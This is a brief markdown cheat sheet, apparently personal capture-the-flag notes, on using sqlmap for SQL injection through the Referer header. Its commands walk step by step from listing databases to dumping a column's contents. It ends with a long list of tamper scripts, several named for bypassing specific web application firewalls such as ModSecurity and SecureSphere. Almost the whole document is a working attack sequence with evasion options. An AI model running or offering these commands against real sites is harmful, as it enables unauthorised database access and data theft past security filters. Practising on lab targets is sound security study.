# sqlmap

```
sqlmap -u http://xxxx/ --referer="1*" --dbs
```

```angular2html
sqlmap -u http://xxx/ --referer="1*" -D sqli --tables
```

```angular2html
sqlmap -u http://xxxx/ --referer="1*" -D sqli -T ktlwtynzsn --columns
```

```angular2html
sqlmap -u http://xxxx/ --referer="1*" -D sqli -T ktlwtynzsn -C hgyqcvsqof --dump
```


```--tamper```

[tamper](https://pingmaoer.github.io/2019/06/24/sqlmap-tamper%E8%AF%A6%E8%A7%A3/)
```angular2html
tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
```